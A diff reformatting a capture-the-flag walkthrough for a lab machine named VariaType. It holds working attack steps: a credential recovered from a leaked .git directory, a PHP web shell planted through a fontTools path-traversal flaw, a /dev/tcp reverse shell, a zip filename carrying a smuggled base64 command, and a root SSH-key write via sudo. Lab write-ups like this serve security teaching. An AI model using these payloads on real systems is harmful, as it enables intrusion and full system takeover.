 30e791b764cb2a50fcb3e2279fea9737444870
+```
 
-&#x20;
+```bash
+cd ..
 
-┌──(root㉿fsocity)-[/home/…/portal_dump/.git/objects/50]
-
-└─# cd ..
-
-&#x20;
-
-┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]
-
-└─# cd 00
-
-&#x20;
+cd 00
 ```
 
 - 🔍 *Lets look at the logs*
 
-```text
-&#x20;git log --oneline
+```bash
+git log --oneline
+```
 
+```text
 753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
 
 5030e79 feat: initial portal implementation
@@ -1326,51 +1217,61 @@ The History: The ID of the commit that came right before it (the "parent").
 ```text
 for dir in *; do
 
-&#x20;   if [ -d "$dir" ]; then
+    if [ -d "$dir" ]; then
+```
 
-&#x20;       cd "$dir"
+```bash
+cd "$dir"
+```
 
-&#x20;       for file in *; do
+```text
+for file in *; do
 
-&#x20;           # Skip if no files exist in the subdirectory
+            # Skip if no files exist in the subdirectory
 
-&#x20;           [ -e "$file" ] || continue
+            [ -e "$file" ] || continue
 
-&#x20;
+            # Run Python to decompress and check the file
+```
 
-&#x20;           # Run Python to decompress and check the file
-
-&#x20;           python3 -c "
+```bash
+python3 -c "
 
 import zlib, sys
 
 try:
 
-&#x20;   with open('$file', 'rb') as f:
+    with open('$file', 'rb') as f:
 
-&#x20;       # Git objects are zlib compressed
+        # Git objects are zlib compressed
 
-&#x20;       data = zlib.decompress(f.read())
+        data = zlib.decompress(f.read())
 
-&#x20;       if b'gitbot' in data:
+        if b'gitbot' in data:
 
-&#x20;           print('\\n*** FOUND DATA IN: $dir/$file ***')
+            print('\\n*** FOUND DATA IN: $dir/$file ***')
 
-&#x20;           # Show the content, ignoring non-text characters
+            # Show the content, ignoring non-text characters
 
-&#x20;           print(data.decode('utf-8', errors='ignore'))
+            print(data.decode('utf-8', errors='ignore'))
 
 except Exception:
 
-&#x20;   pass
+    pass
 
 " 2>/dev/null
+```
 
-&#x20;       done
+```text
+done
+```
 
-&#x20;       cd ..
+```bash
+cd ..
+```
 
-&#x20;   fi
+```text
+fi
 
 done
 
@@ -1401,8 +1302,10 @@ fix: add gitbot user for automated validation pipeline
 
 ```bash
 curl -o c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 \\
+```
 
-&#x20;    http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4
+```text
+http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4
 ```
 
 - 🔍 *Lets use this python script to decompress this hash properly*
@@ -1418,11 +1321,9 @@ import os
 
 with open('c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4', 'rb') as f:
 
-&#x20;   compressed = f.read()
+    compressed = f.read()
 
-&#x20;   data = zlib.decompress(compressed)
-
-&#x20;
+    data = zlib.decompress(compressed)
 
 print('Raw tree data (hex):')
 
@@ -1440,80 +1341,68 @@ header_end = data.find(b'\\0')
 
 if header_end > 0:
 
-&#x20;   print(f'Header: {data[:header_end].decode()}')
+    print(f'Header: {data[:header_end].decode()}')
 
-&#x20;   pos = header_end + 1
+    pos = header_end + 1
 
-&#x20;
+    # Parse tree entries
 
-&#x20;   # Parse tree entries
+    while pos < len(data):
 
-&#x20;   while pos < len(data):
+        # Find the space that separates mode and filename
 
-&#x20;       # Find the space that separates mode and filename
+        space_pos = data.find(b' ', pos)
 
-&#x20;       space_pos = data.find(b' ', pos)
+        if space_pos == -1:
 
-&#x20;       if space_pos == -1:
+            break
 
-&#x20;           break
+        mode = data[pos:space_pos].decode()
 
-&#x20;
+        pos = space_pos + 1
 
-&#x20;       mode = data[pos:space_pos].decode()
+        # Find null terminator after filename
 
-&#x20;       pos = space_pos + 1
+        null_pos = data.find(b'\\0', pos)
 
-&#x20;
+        if null_pos == -1:
 
-&#x20;       # Find null terminator after filename
+            break
 
-&#x20;       null_pos = data.find(b'\\0', pos)
+        filename = data[pos:null_pos].decode()
 
-&#x20;       if null_pos == -1:
+        pos = null_pos + 1
 
-&#x20;           break
+        # Next 20 bytes are SHA-1 hash
 
-&#x20;
+        sha1 = data[pos:pos+20].hex()
 
-&#x20;       filename = data[pos:null_pos].decode()
+        pos += 20
 
-&#x20;       pos = null_pos + 1
+        print(f'\\nFile: {filename}')
 
-&#x20;
+        print(f'  Mode: {mode}')
 
-&#x20;       # Next 20 bytes are SHA-1 hash
+        print(f'  SHA1: {sha1}')
 
-&#x20;       sha1 = data[pos:pos+20].hex()
+        # Check if this is auth.php
 
-&#x20;       pos += 20
+        if filename == 'auth.php':
 
-&#x20;
+            print('  *** THIS IS THE AUTH.PHP BLOB ***')
 
-&#x20;       print(f'\\nFile: {filename}')
+            print(f'  Blob hash: {sha1}')
 
-&#x20;       print(f'  Mode: {mode}')
+            print(f'  Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3')
 
-&#x20;       print(f'  SHA1: {sha1}')
+            if sha1 == '615e621dce970c2c1c16d2a1e26c12658e3669b3':
 
-&#x20;
-
-&#x20;       # Check if this is auth.php
-
-&#x20;       if filename == 'auth.php':
-
-&#x20;           print('  *** THIS IS THE AUTH.PHP BLOB ***')
-
-&#x20;           print(f'  Blob hash: {sha1}')
-
-&#x20;           print(f'  Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3')
-
-&#x20;           if sha1 == '615e621dce970c2c1c16d2a1e26c12658e3669b3':
-
-&#x20;               print('  ✓ MATCH! This is the credentials file!')
+                print('  ✓ MATCH! This is the credentials file!')
 
 "
+```
 
+```text
 Raw tree data (hex):
 
 747265652033360031303036343420617574682e70687000b328305f0e85c2b97a7e2a94978ae20f16db75e8
@@ -1528,15 +1417,15 @@ Header: tree 36
 
 File: auth.php
 
-&#x20; Mode: 100644
+  Mode: 100644
 
-&#x20; SHA1: b328305f0e85c2b97a7e2a94978ae20f16db75e8
+  SHA1: b328305f0e85c2b97a7e2a94978ae20f16db75e8
 
-&#x20; *** THIS IS THE AUTH.PHP BLOB ***
+  *** THIS IS THE AUTH.PHP BLOB ***
 
-&#x20; Blob hash: b328305f0e85c2b97a7e2a94978ae20f16db75e8
+  Blob hash: b328305f0e85c2b97a7e2a94978ae20f16db75e8
 
-&#x20; Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3
+  Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3
 ```
 
 - 🔍 *Interesting! The tree shows a different blob hash than what we expected! The actual hash from the tree is b328305f0e85c2b97a7e2a94978ae20f16db75e8, not 615e621.... This means the auth.php content in this commit is different from what was shown in the git diff earlier.*
@@ -1545,13 +1434,17 @@ File: auth.php
 
 ```bash
 curl -o b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 \\
+```
 
-&#x20;    http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8
+```text
+http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8
+```
 
-┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]
+```bash
+ls
+```
 
-└─# ls
-
+```text
 00  50  6f  75  b3  c6  info
 ```
 
@@ -1564,31 +1457,37 @@ import zlib, sys
 
 try:
 
-&#x20;   with open('$file', 'rb') as f:
+    with open('$file', 'rb') as f:
 
-&#x20;       # Git objects are zlib compressed
+        # Git objects are zlib compressed
 
-&#x20;       data = zlib.decompress(f.read())
+        data = zlib.decompress(f.read())
 
-&#x20;       if b'gitbot' in data:
+        if b'gitbot' in data:
 
-&#x20;           print('\\n*** FOUND DATA IN: $dir/$file ***')
+            print('\\n*** FOUND DATA IN: $dir/$file ***')
 
-&#x20;           # Show the content, ignoring non-text characters
+            # Show the content, ignoring non-text characters
 
-&#x20;           print(data.decode('utf-8', errors='ignore'))
+            print(data.decode('utf-8', errors='ignore'))
 
 except Exception:
 
-&#x20;   pass
+    pass
 
 " 2>/dev/null
+```
 
-&#x20;       done
+```text
+done
+```
 
-&#x20;       cd ..
+```bash
+cd ..
+```
 
-&#x20;   fi
+```text
+fi
 
 done
 
@@ -1612,7 +1511,7 @@ session_start();
 
 $USERS = [
 
-&#x20;   **'gitbot' => 'G1tB0t_Acc3ss_2025!'**
+    **'gitbot' => 'G1tB0t_Acc3ss_2025!'**
 
 ];
 ```
@@ -1625,32 +1524,31 @@ $USERS = [
 
 - 🔍 *Research revealed CVE-2025-66034, a critical vulnerability in fontTools.varLib affecting versions 4.33.0 to before 4.60.2.*
 
+> [!IMPORTANT]
+> CVE-2025-66034 -
+
 ```text
-&#x20;[!] CVE-2025-66034 -
+The vulnerability had two components:
 
-&#x09;The vulnerability had two components:
+	1.Path Traversal: The filename attribute in <variable-fonts> wasn't sanitized, allowing ../../../../ sequences
 
-&#x09;1.Path Traversal: The filename attribute in <variable-fonts> wasn't sanitized, allowing ../../../../ sequences
-
-&#x09;2.XML Injection: CDATA sections in <labelname> elements allowed injecting arbitrary content
+	2.XML Injection: CDATA sections in <labelname> elements allowed injecting arbitrary content
 ```
 
 - 🔍 *The CDATA section allows us to use php scripts inside the XML <labelname> attribute.*
 
-- 🔍 *Exploitation Path :-*
+- 🎯 **Exploitation Path :-**
+
+- 🔍 *Will create a python script that will generate .ttf files for us*
+
+- 🔍 *then will create a malicious designspace file which contains, CDATA section,*
+
+- 🔍 *Will upload it to the target*
+
+- 🔍 *will get the shell!*
 
 ```text
-&#x09;[$] Will create a python script that will generate .ttf files for us
-
-&#x09;[$]  then will create a malicious designspace file which contains, CDATA section, 
-
-&#x09;[$] Will upload it to the target 
-
-&#x09;[$] will get the shell!
-
 (note:- one more thing about the found vulnerability is, we can create a file at a specific location. and then later we can use it to apply shell commands via URL)
-
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
 ## Step 2 - Initial Foothold-
@@ -1668,107 +1566,103 @@ from fontTools.pens.ttGlyphPen import TTGlyphPen
 
 def create_source_font(filename, weight=400):
 
-&#x20;   fb = FontBuilder(unitsPerEm=1000, isTTF=True)
+    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
 
-&#x20;   fb.setupGlyphOrder([".notdef"])
+    fb.setupGlyphOrder([".notdef"])
 
-&#x20;   fb.setupCharacterMap({})
+    fb.setupCharacterMap({})
 
-&#x20;   
+    pen = TTGlyphPen(None)
 
-&#x20;   pen = TTGlyphPen(None)
+    pen.moveTo((0, 0))
 
-&#x20;   pen.moveTo((0, 0))
+    pen.lineTo((500, 0))
 
-&#x20;   pen.lineTo((500, 0))
+    pen.lineTo((500, 500))
 
-&#x20;   pen.lineTo((500, 500))
+    pen.lineTo((0, 500))
 
-&#x20;   pen.lineTo((0, 500))
+    pen.closePath()
 
-&#x20;   pen.closePath()
+    fb.setupGlyf({".notdef": pen.glyph()})
 
-&#x20;   
+    fb.setupHorizontalMetrics({".notdef": (500, 0)})
 
-&#x20;   fb.setupGlyf({".notdef": pen.glyph()})
+    fb.setupHorizontalHeader(ascent=800, descent=-200)
 
-&#x20;   fb.setupHorizontalMetrics({".notdef": (500, 0)})
+    fb.setupOS2(usWeightClass=weight)
 
-&#x20;   fb.setupHorizontalHeader(ascent=800, descent=-200)
+    fb.setupPost()
 
-&#x20;   fb.setupOS2(usWeightClass=weight)
+    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
 
-&#x20;   fb.setupPost()
-
-&#x20;   fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
-
-&#x20;   fb.save(filename)
+    fb.save(filename)
 
 if __name__ == '__main__':
 
-&#x20;   os.chdir(os.path.dirname(os.path.abspath(__file__)))
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
 
-&#x20;   create_source_font("source-light.ttf", weight=100)
+    create_source_font("source-light.ttf", weight=100)
 
-&#x20;   create_source_font("source-regular.ttf", weight=400)
+    create_source_font("source-regular.ttf", weight=400)
 ```
 
 - 🔍 *Run this script and you'll able to see some, source-regular.ttf & source-light.ttf files*
 
 - 🔍 *Now Lets Create our malicious.designspace file*
 
-```text
+```xml
 <?xml version='1.0' encoding='UTF-8'?>
 
 <designspace format="5.0">
 
-&#x20;   <axes>
+    <axes>
 
-&#x20;       <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
+        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
 
-&#x20;           <labelname xml:lang="en">**<![CDATA[<?php system($_GET['cmd']);** ?>]]></labelname>
+            <labelname xml:lang="en">**<![CDATA[<?php system($_GET['cmd']);** ?>]]></labelname>
 
-&#x20;       </axis>
+        </axis>
 
-&#x20;   </axes>
+    </axes>
 
-&#x20;   <sources>
+    <sources>
 
-&#x20;       <source filename="source-light.ttf" name="Light">
+        <source filename="source-light.ttf" name="Light">
 
-&#x20;           <location>
+            <location>
 
-&#x20;               <dimension name="Weight" xvalue="100"/>
+                <dimension name="Weight" xvalue="100"/>
 
-&#x20;           </location>
+            </location>
 
-&#x20;       </source>
+        </source>
 
-&#x20;       <source filename="source-regular.ttf" name="Regular">
+        <source filename="source-regular.ttf" name="Regular">
 
-&#x20;           <location>
+            <location>
 
-&#x20;               <dimension name="Weight" xvalue="400"/>
+                <dimension name="Weight" xvalue="400"/>
 
-&#x20;           </location>
+            </location>
 
-&#x20;       </source>
+        </source>
 
-&#x20;   </sources>
+    </sources>
 
-&#x20;   <variable-fonts>
+    <variable-fonts>
 
-&#x20;       <variable-font name="MaliciousFont" filename=**"../../../../../../../var/www/portal.variatype.htb/public/files/shell.php"**>
+        <variable-font name="MaliciousFont" filename=**"../../../../../../../var/www/portal.variatype.htb/public/files/shell.php"**>
 
-&#x20;           <axis-subsets>
+            <axis-subsets>
 
-&#x20;               <axis-subset name="Weight"/>
+                <axis-subset name="Weight"/>
 
-&#x20;           </axis-subsets>
+            </axis-subsets>
 
-&#x20;       </variable-font>
+        </variable-font>
 
-&#x20;   </variable-fonts>
+    </variable-fonts>
 
 </designspace>
 ```
@@ -1784,20 +1678,22 @@ if __name__ == '__main__':
 ```bash
 curl -v -X POST http://variatype.htb/tools/variable-font-generator/process \\
 
-&#x20; -F "designspace=@malicious.designspace" \\
+  -F "designspace=@malicious.designspace" \\
 
-&#x20; -F "masters=@source-light.ttf" \\
+  -F "masters=@source-light.ttf" \\
 
-&#x20; -F "masters=@source-regular.ttf" \\
+  -F "masters=@source-regular.ttf" \\
 
-&#x20; -H "Expect:"
+  -H "Expect:"
 ```
 
 - 🔍 *Now test if we can Write cmd commands in the URL*
 
 ```bash
 curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
+```
 
+```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -1813,7 +1709,9 @@ nc -lvnp 4444
 
 ```bash
 curl -s "http://portal.variatype.htb/files/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.****%2F4444%200%3E%261%27"
+```
 
+```text
 (note:- change ip)
 ```
 
@@ -1829,7 +1727,9 @@ connect to [10.10.14.67] from (UNKNOWN) [10.129.9.74] 35860
 bash: cannot set terminal process group (3365): Inappropriate ioctl for device
 
 bash: no job control in this shell
+```
 
+```bash
 www-data@variatype:~/portal.variatype.htb/public/files$
 ```
 
@@ -1841,15 +1741,13 @@ www-data@variatype:~/portal.variatype.htb/public/files$
 
 - 🔍 *In our case there is a script "/home/steve/bin/process_client_submissions.sh", which automatically runs after a period of time.*
 
-```text
-&#x09;[^] Attack path -
+- 🎯 **Attack path -**
 
-&#x09;	[$] will create a python script, which will create a zip file containing a rev shell base64 encoded payload 
+- 🔍 *will create a python script, which will create a zip file containing a rev shell base64 encoded payload*
 
-&#x09;	[$] will share it to target
+- 🔍 *will share it to target*
 
-&#x09;	[$] when the CRON jobs runs, and the zip file is being extracted, it runs the payload!
-```
+- 🔍 *when the CRON jobs runs, and the zip file is being extracted, it runs the payload!*
 
 - 🔍 *Okay So lets create the python scritp*
 
@@ -1870,7 +1768,7 @@ exploit_filename = f'$(echo {payload}|base64 -d|bash).ttf'
 
 with zipfile.ZipFile('exploit.zip', 'w') as zipf:
 
-&#x20;   zipf.writestr(exploit_filename, "This file will execute a reverse shell when extracted")
+    zipf.writestr(exploit_filename, "This file will execute a reverse shell when extracted")
 
 print(f"[+] Created exploit.zip with filename: {exploit_filename}")
 
@@ -1883,8 +1781,6 @@ print(f"[+] Payload: {rev_shell}")
 
 ```bash
 curl http://YOUR_IP:8000/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip
-
-&#x20;
 ```
 
 - 🔍 *Setup a listener, and wait for 1 to 2 minutes, to let the CRON job hit*
@@ -1899,7 +1795,9 @@ connect to [10.10.14.67] from (UNKNOWN) [10.129.9.74] 34090
 bash: cannot set terminal process group (4529): Inappropriate ioctl for device
 
 bash: no job control in this shell
+```
 
+```bash
 steve@variatype:/tmp/ffarchive-4530-1$
 ```
 
@@ -1907,30 +1805,28 @@ steve@variatype:/tmp/ffarchive-4530-1$
 
 - 🔍 *get user flag!*
 
-```text
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-```
-
 ## Step 3 - Privilege Escalation
 
 - 🔍 *lets check steve's privileges*
 
-```text
+```bash
 steve@variatype:/tmp/ffarchive-3775-1$ sudo -l
 
 sudo -l
+```
 
+```text
 Matching Defaults entries for steve on variatype:
 
-&#x20;   env_reset, mail_badpass,
+    env_reset, mail_badpass,
 
-&#x20;   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
 
-&#x20;   use_pty
+    use_pty
 
 User steve may run the following commands on variatype:
 
-&#x20;   (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
+    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
 ```
 
 - 🔍 *So steve can run python3 and install_validator.py as root*
@@ -1938,21 +1834,21 @@ User steve may run the following commands on variatype:
 - 🔍 *i have analyzed the file-->*
 
 ```text
-&#x09;Vulnerability Analysis:-
+Vulnerability Analysis:-
 
-&#x09;The script used setuptools.package_index.PackageIndex.download() which has a vulnerability:
+	The script used setuptools.package_index.PackageIndex.download() which has a vulnerability:
 
-&#x09;It doesn't sanitize the filename portion of the URL
+	It doesn't sanitize the filename portion of the URL
 
-&#x09;Path traversal sequences (../) in the URL path can write files outside the intended directory
+	Path traversal sequences (../) in the URL path can write files outside the intended directory
 
-&#x09;The script runs as root via sudo
+	The script runs as root via sudo
 
-&#x09;However, there were two protections:
+	However, there were two protections:
 
-&#x09;1.URL length check (can't have too many / characters)
+	1.URL length check (can't have too many / characters)
 
-&#x09;2.PackageIndex requires an #egg=name-version suffix for Python packages
+	2.PackageIndex requires an #egg=name-version suffix for Python packages
 ```
 
 - 🔍 *Since we have sudo access to run the install_validator.py script as root, we can use it to add our SSH key to root's authorized_keys for persistent access.*
@@ -1969,26 +1865,26 @@ cp /tmp/rootkey.pub /tmp/serve/authorized_keys
 
 - 🔍 *Create a Custom HTTP server which will serve our keys!*
 
-```text
+```python
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 class Handler(BaseHTTPRequestHandler):
 
-&#x20;   def do_GET(self):
+    def do_GET(self):
 
-&#x20;       with open('authorized_keys', 'rb') as f:
+        with open('authorized_keys', 'rb') as f:
 
-&#x20;           data = f.read()
+            data = f.read()
 
-&#x20;       self.send_response(200)
+        self.send_response(200)
 
-&#x20;       self.send_header('Content-Type', 'text/plain')
+        self.send_header('Content-Type', 'text/plain')
 
-&#x20;       self.send_header('Content-Length', len(data))
+        self.send_header('Content-Length', len(data))
 
-&#x20;       self.end_headers()
+        self.end_headers()
 
-&#x20;       self.wfile.write(data)
+        self.wfile.write(data)
 
 HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
 ```
@@ -2000,8 +1896,10 @@ HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
 ```bash
 sudo /usr/bin/python3 /opt/font-tools/install_validator.py \\
 
-&#x20; "http://YOUR_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
+  "http://YOUR_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
+```
 
+```text
 2026-03-20 02:11:33,769 [INFO] Attempting to install plugin from: http://10.10.14.**:8888/%2Froot%2F.ssh%2Fauthorized_keys
 
 2026-03-20 02:11:33,777 [INFO] Downloading http://10.10.14.**:8888/%2Froot%2F.ssh%2Fauthorized_keys
@@ -2015,7 +1913,9 @@ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \\
 
 ```bash
 ssh -i /tmp/rootkey root@10.129.9.74
+```
 
+```text
 The authenticity of host '10.129.9.74 (10.129.9.74)' can't be established.
 
 ED25519 key fingerprint is SHA256:0Wqe+nNeYlUwY+F669ywmS9kPUMYXqJh5xxCxwyCapI.
@@ -2039,13 +1939,18 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 
 Last login: Fri Mar 20 02:14:34 2026 from 10.10.14.67
+```
 
+```bash
 root@variatype:~# cat /root/root.txt
+```
 
+```text
 3accbc651e835f15360e76cd75c6f567
 ```
 
 - 🔍 *PAWNED!!!! EASyy!!*
+
 
 ## Mitigations & Security Perspective
 
